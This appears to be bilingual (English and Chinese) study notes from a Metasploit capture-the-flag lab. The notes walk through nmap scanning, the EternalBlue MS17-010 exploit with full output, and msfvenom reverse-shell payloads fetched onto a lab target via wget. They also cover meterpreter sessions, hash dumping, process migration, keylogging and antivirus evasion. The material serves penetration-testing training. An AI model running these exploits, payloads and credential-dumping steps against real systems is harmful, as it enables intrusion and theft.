[*] Nmap: Nmap scan report for ip-10-10-60-230.eu-west-1.compute.internal (10.10.60.230)
[*] Nmap: Host is up (0.0084s latency).
[*] Nmap: Not shown: 65530 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         ProFTPD 1.3.5e
[*] Nmap: 22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 8000/tcp open  http        WebFS httpd 1.21
[*] Nmap: MAC Address: 02:A6:29:8F:EC:CB (Unknown)
[*] Nmap: Service Info: Host: IP-10-10-60-230; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.15 seconds

# hosts 和 services 命令获取与目标系统上运行的 hosts 和服务相关的信息
msf6 > hosts

Hosts
=====

address       mac                name                                     os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----                                     -------  ---------  -----  -------  ----  --------
10.10.60.230  02:a6:29:8f:ec:cb  ip-10-10-60-230.eu-west-1.compute.inter  Unknown                    device
                                 nal

msf6 > services
Services
========

host          port  proto  name         state  info
----          ----  -----  ----         -----  ----
10.10.60.230  21    tcp    ftp          open   ProFTPD 1.3.5e
10.10.60.230  22    tcp    ssh          open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.60.230  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.60.230  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.60.230  8000  tcp    http         open   WebFS httpd 1.21

```
```bash
# 将数据库中保存的所有hosts 设置到 RHOSTS 
hosts -R

# 在环境中搜索特定服务
msf6 > services -S http
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.60.230  8000  tcp    http  open   WebFS httpd 1.21

```

## Vulnerability Scanning 

Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

Finding vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint the target. The better you are at these stages, the more options Metasploit may provide you.

<span style="font-size: 23px;">**Q&A**</span>

Who wrote the module that allows us to check SMTP servers for open relay?

```bash
msf6 > search /scanner/smtp

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_version                       normal  No     SMTP Banner Grabber
   1  auxiliary/scanner/smtp/smtp_ntlm_domain                   normal  No     SMTP NTLM Domain Extraction
   2  auxiliary/scanner/smtp/smtp_relay                         normal  No     SMTP Open Relay Detection
   3  auxiliary/scanner/smtp/smtp_enum                          normal  No     SMTP User Enumeration Utility
msf6 > use 2
msf6 auxiliary(scanner/smtp/smtp_relay) > info

       Name: SMTP Open Relay Detection
     Module: auxiliary/scanner/smtp/smtp_relay
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Campbell Murray
  xistence <xistence@0x90.nl>

```

## Exploitation

As the name suggests, Metasploit is an exploitation framework. Exploits are the most populated module category

You can search exploits using the `search` command, obtain more information about the exploit using the `info` command, and launch the exploit using `exploit`. While the process itself is simple, remember that a successful outcome depends on a thorough understanding of services running on the target system.

<span style="font-size: 23px;">**Q&A**</span>

```bash
# step1 running nmap to see if we can find any running services
msf6 > nmap -p- -sS -A 10.10.38.131
[*] exec: nmap -p- -sS -A 10.10.38.131

Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-22 02:06 UTC
Nmap scan report for ip-10-10-38-131.eu-west-1.compute.internal (10.10.38.131)
Host is up (0.00060s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2025-05-21T02:06:11
|_Not valid after:  2025-11-20T02:06:11
|_ssl-date: 2025-05-22T02:08:37+00:00; 0s from scanner time.

```
```bash
# step2 use a vulnerability scanning module to find potential vulnerabilities.
msf6 > nmap 10.10.38.131 -p 139,445 -script vuln
[*] exec: nmap 10.10.38.131 -p 139,445 -script vuln

Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-22 02:12 UTC
Nmap scan report for ip-10-10-38-131.eu-west-1.compute.internal (10.10.38.131)
Host is up (0.00028s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:4A:27:7B:BB:33 (Unknown)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds

```

```bash 
# step3 search
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

```

```bash
# step4
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.38.131
rhosts => 10.10.38.131
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.100.216:4444 
[*] 10.10.38.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.38.131:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.38.131:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.38.131:445 - The target is vulnerable.
[*] 10.10.38.131:445 - Connecting to target for exploitation.
[+] 10.10.38.131:445 - Connection established for exploitation.
[+] 10.10.38.131:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.38.131:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.38.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.38.131:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.38.131:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.38.131:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.38.131:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.38.131:445 - Sending all but last fragment of exploit packet
[*] 10.10.38.131:445 - Starting non-paged pool grooming
[+] 10.10.38.131:445 - Sending SMBv2 buffers
[+] 10.10.38.131:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.38.131:445 - Sending final SMBv2 buffers.
[*] 10.10.38.131:445 - Sending last fragment of exploit packet!
[*] 10.10.38.131:445 - Receiving response from exploit packet
[+] 10.10.38.131:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.38.131:445 - Sending egg to corrupted connection.
[*] 10.10.38.131:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.38.131
[*] Meterpreter session 1 opened (10.10.100.216:4444 -> 10.10.38.131:49192) at 2025-05-22 02:22:09 +0000
[+] 10.10.38.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.38.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.38.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 

```

## session

在 Metasploit 中，一个 **Session** 代表了**你与一个被成功入侵的目标系统之间建立的连接和交互通道**。当一个 Payload (例如 Meterpreter 或者一个普通的 shell) 在目标系统上成功执行并回连到你的 Metasploit 攻击机时，就会建立一个 Session。

你可以把 Session 理解为：

* **一个远程控制的通道**：一旦 Session 建立，你就可以通过这个通道向目标系统发送命令、执行操作、上传下载文件等。
* **一个活动的连接实例**：每个成功入侵的目标都会对应一个或多个 Session。Metasploit 可以同时管理多个活动的 Session，允许你同时与多个被控主机进行交互。

**Session 是如何产生的？**

1.  **漏洞利用成功**：你使用 Metasploit 的一个 Exploit (漏洞利用模块) 攻击目标系统。
2.  **Payload 执行**：如果漏洞利用成功，你预设的 Payload (由 `msfvenom` 生成或在 Exploit 中直接指定) 会被传送到目标系统并执行。
3.  **建立连接**：
    * **反向连接 (Reverse Connection)**: 这是最常见的方式。目标系统上的 Payload 会主动连接回你指定的 Metasploit 攻击机 IP 和端口 (LHOST 和 LPORT)。例如，`windows/meterpreter/reverse_tcp` Payload 就是这样工作的。
    * **正向连接 (Bind Connection)**: 目标系统上的 Payload 会在目标机上监听一个端口，等待你的 Metasploit 攻击机去连接它。例如，`windows/meterpreter/bind_tcp`。这种方式在目标机有公网 IP 且防火墙允许入站连接时比较有用。
4.  **Session 创建**: 当连接成功建立后，Metasploit 的 multi/handler (或者 Exploit 模块自身) 会接收这个连接，并在 `msfconsole` 中创建一个新的 Session。你会看到类似 "Meterpreter session 1 opened" 或 "Command shell session 2 opened" 的提示。

**Session 的类型：**

Session 的类型主要取决于你使用的 Payload 类型：

* **Meterpreter Session**: 这是最强大和最常用的 Session 类型。当你使用 Meterpreter 作为 Payload 时，建立的就是 Meterpreter Session。它提供了一个功能丰富的交互式命令行，可以执行各种高级的后渗透操作（如文件操作、进程迁移、权限提升、键盘记录、屏幕截图等），并且通常具有更好的隐蔽性。
* **Shell Session (Command Shell Session)**: 当你使用提供基本命令行访问的 Payload (例如 `windows/shell/reverse_tcp` 或 `linux/x86/shell_reverse_tcp`) 时，会建立一个 Shell Session。这种 Session 提供了目标系统的一个标准命令行界面 (如 Windows 的 `cmd.exe` 或 Linux 的 `sh`/`bash`)。功能相对 Meterpreter Session 要基础一些，但对于执行简单命令和脚本仍然很有用。
* **其他特定类型的 Session**: 某些特定的 Payload 或后渗透模块可能会创建其他类型的 Session，例如 VNC Session (用于远程桌面访问)等，但这相对少见。

**如何管理和使用 Session？**

在 `msfconsole` 中，你可以使用一系列命令来管理和与 Session 交互：

* `sessions` 或 `sessions -l`: 列出当前所有活动的 Session，以及它们的 ID、类型、连接信息等。
* `sessions -i <session_id>`: 与指定的 Session ID 进行交互。例如，`sessions -i 1` 就会进入 Session 1 的控制台。
    * 如果进入的是 Meterpreter Session，你会看到 `meterpreter >` 提示符。
    * 如果进入的是 Shell Session，你会看到目标系统的命令行提示符。
* `background` 或 `Ctrl+Z`: 将当前交互的 Session放到后台，返回到 `msfconsole` 主提示符，但 Session 仍然保持活动。
* `sessions -k <session_id>`: 终止指定的 Session。
* `sessions -K`: 终止所有活动的 Session。
* `sessions -u <session_id>`: (对于 Meterpreter Session) 尝试将一个普通的 Shell Session 升级为 Meterpreter Session。

**Session 的重要性：**

Session 是 Metasploit 后渗透阶段的核心。一旦获得了 Session，就意味着你已经成功控制了目标系统，接下来就可以利用 Session 提供的能力进行更深入的渗透、信息收集、权限提升、横向移动等操作，最终达成你的攻击目标。

简单总结一下：

* **Payload** 是在目标机上执行的代码。
* **Meterpreter** 是一种高级的 Payload。
* **`msfvenom`** 是用来生成和编码这些 Payload 的工具。
* **Session** 是当 Payload 成功执行并在你的攻击机和目标机之间建立起连接后，Metasploit 用来管理这个活动连接的实例。

理解了这些概念之间的关系，你就能更好地掌握 Metasploit 的工作流程了。

## Msfvenom

Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.

Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

**Output formats**

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The `msfvenom --list formats` command can be used to list supported output formats

**Encoders**

Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.

```bash
root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1507 (iteration=0)
php/base64 chosen with final size 1507
Payload size: 1507 bytes
eval(base64_decode(Lyo8P3BocCAvKiov...
```
**Handlers**

Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are:

1. Generate the PHP shell using MSFvenom
2. Start the Metasploit handler
3. Execute the PHP shell

MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.

```bash
root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3020 bytes
root@ip-10-0-2-19:~#
```

<span style="font-size: 23px;">**Q&A**</span>

**Questions:**

Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.

Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).

Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine).

Get a meterpreter session on the target machine.

Use a post exploitation module to dump hashes of other users on the system.

What is the other user's password hash?

**AttackBox(ip:10.10.224.138)**
```bash
# Create the meterpreter payload
msf6 > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.224.138 LPORT=1234 -f elf > rev_shell.elf
[*] exec: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.224.138 LPORT=1234 -f elf > rev_shell.elf

Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
msf6 > ls
[*] exec: ls

'=2.5,!=2.5.0,!=2.5.2,!=2.6'   CTFBuilder   Downloads	   Pictures   rev_shell.elf   Scripts   thinclient_drives
 burp.json		       Desktop	    Instructions   Postman    Rooms	      snap      Tools

# start a Python web server on your attacking machine
msf6 > python3 -m http.server 9000
[*] exec: python3 -m http.server 9000

Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.10.52.151 - - [22/May/2025 04:17:32] "GET /rev_shell.elf HTTP/1.1" 200 -

# use exploit/multi/handler module exploit target machine

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.224.138
lhost => 10.10.224.138
msf6 exploit(multi/handler) > set lport 1234
lport => 1234

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.224.138:1234 
[*] Sending stage (1017704 bytes) to 10.10.52.151
[*] Meterpreter session 1 opened (10.10.224.138:1234 -> 10.10.52.151:32908) at 2025-05-22 04:28:53 +0100

meterpreter > 

# Use a post exploitation module to dump hashes of other users on the system. 

meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type            Information     Connection
  --  ----  ----            -----------     ----------
  1         meterpreter x8  root @ ip-10-1  10.10.224.138:
            6/linux         0-52-151.eu-we  1234 -> 10.10.
                            st-1.compute.i  52.151:32908 (
                            nternal         10.10.52.151)

msf6 exploit(multi/handler) > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Settin  Required  Description
            g
   ----     --------------  --------  -----------
   SESSION                  yes       The session to run t
                                      his module on


View the full module info with the info, or info -d command.

msf6 post(linux/gather/hashdump) > set session 1
session => 1
msf6 post(linux/gather/hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Settin  Required  Description
            g
   ----     --------------  --------  -----------
   SESSION  1               yes       The session to run t
                                      his module on


View the full module info with the info, or info -d command.

msf6 post(linux/gather/hashdump) > run
[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /root/.msf4/loot/20250522043055_default_10.10.52.151_linux.hashes_388713.txt
[*] Post module execution completed

```
**target machine(ip:10.10.52.151)**  
```bash
# connect via SSH target machine 
root@ip-10-10-224-138:~# ssh murphy@10.10.52.151

$ sudo su
[sudo] password for murphy: 
# download the meterpreter payload
root@ip-10-10-52-151:/# wget http://10.10.224.138:9000/rev_shell.elf
--2025-05-22 03:17:32--  http://10.10.224.138:9000/rev_shell.elf
Connecting to 10.10.224.138:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [application/octet-stream]
Saving to: \u2018rev_shell.elf\u2019

rev_shell.elf       100%[===================>]     207  --.-KB/s    in 0s      

2025-05-22 03:17:32 (29.8 MB/s) - \u2018rev_shell.elf\u2019 saved [207/207]

# run the file and recieve the connection
root@ip-10-10-52-151:/# chmod +x rev_shell.elf 
root@ip-10-10-52-151:/# ./rev_shell.elf

```
## Meterpreter

Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.

Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code. It is typically deployed using in-memory DLL injection to reside entirely in memory.

<span style="font-size: 23px;">**How does Meterpreter work?**</span>

Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.

Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted(TLS) communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.

```bash
# returns the process ID with which Meterpreter is running
meterpreter > getpid 
Current pid: 1304
```

<span style="font-size: 23px;">**Meterpreter Flavors**</span>

简单来说，**Payloads 是攻击载荷**，而 **Meterpreter 是一种非常高级和强大的 Payload**。

可以将 Payloads 理解为在成功利用漏洞后，你希望在目标系统上执行的**实际代码**。这些代码能让你控制目标系统，比如获取一个命令行（shell）、上传下载文件、或者执行更复杂的操作。

Meterpreter 则是众多 Payloads 中的一种，但它非常特殊和强大，可以看作是一个**增强型的、多功能的后渗透工具**。

下面我们来详细看看它们的区别和关系：

**Payloads (攻击载荷)** 💣

**Payloads** 是 Metasploit 框架中负责在目标系统上执行特定操作的模块。当一个漏洞利用（Exploit）成功后，Payload 就会被传送到目标系统并执行。

Metasploit 中的 Payloads 主要有几种类型：

* **Singles (独立型)**: 这种 Payload 是自包含的，一次性执行一个小任务，比如添加用户、运行一个简单命令（像打开计算器 `calc.exe`）。它们不需要从攻击机下载额外的组件。
* **Stagers (传输器)**: 这种 Payload 非常小巧，它的主要任务是在攻击机和目标机之间建立一个稳定的连接通道。然后，它会负责下载并执行一个更大的、功能更全的 Payload (Stage)。常见的 Stagers 有 `reverse_tcp` (目标机反向连接攻击机) 和 `bind_tcp` (目标机监听端口等待攻击机连接)。
* **Stages (传输体)**: 这是由 Stager 下载并执行的较大型 Payload，它们提供了更高级和复杂的功能。**Meterpreter 就是一种 Stage 类型的 Payload**。

你可以把 Stager 和 Stage 的关系想象成：Stager 是一个“快递员”，它先到达目标地点（目标系统），然后“签收”一个大包裹（Stage），这个大包裹里才是真正有用的东西。

**Meterpreter (元解释器)** 🤖

**Meterpreter** ("Meta-Interpreter" 的缩写) 是 Metasploit 框架中一个非常高级和灵活的 Payload。它在目标系统内存中运行，具有很多强大的后渗透功能，并且难以被检测到。

Meterpreter 的一些主要特点和优势包括：

* **完全基于内存运行**: Meterpreter 通过内存DLL注入等技术，在目标系统的内存中直接运行，不会在磁盘上留下任何文件痕跡 (无文件落地)，这使得它很难被传统的杀毒软件或入侵检测系统发现。
* **加密通信**: Meterpreter 和攻击机之间的通信是加密的，这使得流量更难被分析和检测。
* **强大的功能模块**: Meterpreter 拥有丰富的扩展模块和命令，可以用来：
    * 获取系统信息 (操作系统版本、用户信息等)
    * 文件系统操作 (上传、下载、修改、删除文件)
    * 网络操作 (端口扫描、流量转发)
    * 权限提升
    * 键盘记录
    * 屏幕截图
    * 执行任意命令
    * 迁移进程 (将会话注入到其他更稳定的进程中，增加隐蔽性)
    * 加载其他 Metasploit 模块和脚本
* **跨平台性**: Meterpreter 有针对不同操作系统 (Windows, Linux, macOS, Android 等) 和架构的版本。
* **可扩展性**: 用户可以编写自己的 Meterpreter 脚本和扩展来增加新的功能。

**关系与区别** 🔗

总结一下它们的关系和区别：

* **从属关系**: Meterpreter **是**一种 Payload。更具体地说，它通常是一种 Stage 类型的 Payload，需要 Stager 来辅助部署。
* **功能范围**:
    * **Payloads** 是一个**广义的概念**，包含了所有在目标系统上执行的代码，功能从简单的命令执行到复杂的后门不等。
    * **Meterpreter** 是一种**具体的、功能极其丰富的 Payload 实现**，专注于提供高级的后渗透能力和交互式控制。
* **复杂性**:
    * 普通的 Payloads (如 `windows/shell_reverse_tcp`，提供一个简单的命令行) 相对简单。
    * Meterpreter 则要复杂得多，它是一个完整的命令解释器和控制框架。
* **隐蔽性**: Meterpreter 由于其内存执行和加密通信的特性，通常比很多简单的 Payloads 更难被检测。
* **交互性**: Meterpreter 提供了一个功能丰富的交互式会话，允许攻击者动态地执行各种命令和加载模块。而一些简单的 Payloads 可能只提供一个基本的 shell 接口。

**打个比方**：

* **Exploit (漏洞利用)** 就像是“撬锁的工具”，用来打开目标系统的大门。
* **Payloads (攻击载荷)** 就像是“进入大门后你想做的事情”。
    * 一个简单的 Payload 可能只是“在大厅里喊一句话（执行一个命令）”。
    * 而 **Meterpreter** 则像是“派进去一个全能特工”，这个特工可以悄无声息地在房子里自由活动，收集情报，安放设备，甚至控制整个房子。

因此，当你选择一个 Payload 时，如果目标系统和漏洞利用模块支持，并且你需要进行复杂的后渗透操作，Meterpreter 通常是首选。如果只是需要一个简单的 shell，或者环境限制无法使用 Meterpreter，那么可能会选择其他类型的 Payload。


```bash
msfvenom --list payloads | grep meterpreter | head -n 10
```

<span style="font-size: 23px;">**Meterpreter Commands**</span>

Typing `help` on any Meterpreter session (shown by `meterpreter>` at the prompt) will list all available commands.

Meterpreter will provide you with three primary categories of tools;

- Built-in commands
- Meterpreter tools
- Meterpreter scripting

<span style="font-size: 23px;">**Post-Exploitation**</span>

**Migrate**

Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.

To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716. 
```bash
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
meterpreter >
```
Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You may not be able to gain them back.

**Hashdump**

The **hashdump** command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
While it is not mathematically possible to "crack" these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.

**Search**

The `search` command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.

```bash
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
```
**Shell**

The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.

```bash
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
**load**

you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.

```bash
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!

meterpreter >
```
Once any additional tool is loaded using the load command, you will see new options on the help menu. 

## migration

In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In a case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using `migrate` post-module as follow:

```bash
meterpreter > run post/windows/manage/migrate

[*] Running module against DESKTOP-1AU6NT4
[*] Current server process: powershell.exe (368)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1592
[+] Successfully migrated into process 1592
```